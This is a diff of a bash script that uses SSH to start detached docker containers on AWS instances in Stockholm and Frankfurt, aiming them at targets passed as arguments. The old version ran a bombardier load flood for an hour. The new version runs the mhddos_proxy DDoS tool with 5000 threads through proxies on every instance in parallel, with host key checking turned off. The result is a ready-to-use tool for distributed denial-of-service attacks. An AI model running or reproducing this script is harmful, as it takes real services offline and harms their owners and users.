@@ -1,46 +1,44 @@
 #!/bin/bash
 
 main(){
-	./updateInstancesIPs.sh
+	local STOCKHOLM_INSTANCES_IPS=`./getInstancesIPs.sh -s`
+	local FRANKFURT_INSTANCES_IPS=`./getInstancesIPs.sh -f`
 
-	if [ -f STOCKHOLM_INSTANCES_IPS.txt ]
-	then
-		echo "Stockholm fires on $1 by:"
-		fire "key-stockholm-0.pem" ${@} $(cat STOCKHOLM_INSTANCES_IPS.txt)
-	fi
+	echo -e "Fires on\n${@}\nby:"
 
-	if [ -f FRANKFURT_INSTANCES_IPS.txt ]
-	then
-		echo "Frankfurt fires on $1 by:"
-		fire "key-frankfurt-0.pem" ${@} $(cat FRANKFURT_INSTANCES_IPS.txt)
-	fi
+	for ip in ${STOCKHOLM_INSTANCES_IPS}
+	do
+		fire "key-stockholm-0.pem" ${ip} ${@} &
+	done
+
+	for ip in ${FRANKFURT_INSTANCES_IPS}
+	do
+		fire "key-frankfurt-0.pem" ${ip} ${@} &
+	done
+
 	wait
 }
 
 fire(){
-	local key=${1}
-	local target=${2}
+	local KEY=${1}
+	local IP=${2}
 	shift 2
 
-	for ip in ${@}
-	do
-		process ${key} ${target} ${ip} &
-	done
-}
-
-process(){
-	echo "    ${3}"
+	echo -e "    ${IP}"
 	ssh \
 		-o LogLevel=ERROR \
-		-i ${1} \
-		-o "StrictHostKeyChecking no" "ubuntu@${3}" \
-		screen \
-			-dm sudo docker run \
-			-ti \
-			--rm alpine/bombardier \
-			-c 850 \
-			-d 3600s \
-			-l ${2}
+		-i ${KEY} \
+		-o "StrictHostKeyChecking no" \
+		"ubuntu@${IP}" \
+			screen -dm \
+				sudo docker run \
+					-it \
+					--rm \
+					--pull always portholeascend/mhddos_proxy:latest ${@} \
+					-t 5000 \
+					-p 600 \
+					--proxy-timeout 4 \
+					--debug
 }
 
 ./checkAWS.sh && main ${@} || ./awsCliNa.sh
